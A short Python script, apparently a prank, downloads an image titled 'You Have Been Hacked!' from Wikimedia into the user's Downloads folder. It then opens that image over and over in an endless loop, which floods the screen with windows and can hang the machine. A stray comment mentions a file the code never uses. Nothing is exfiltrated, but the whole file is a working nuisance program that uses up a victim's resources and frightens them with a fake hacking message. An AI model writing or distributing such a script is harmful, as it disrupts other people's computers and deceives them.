import os
import urllib.request
import pathlib


output = (pathlib.Path.home() / "Downloads" / "broski.png")
url = "https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg"

urllib.request.urlretrieve(url, output)

while True:
    os.startfile(output) #open toto.txt

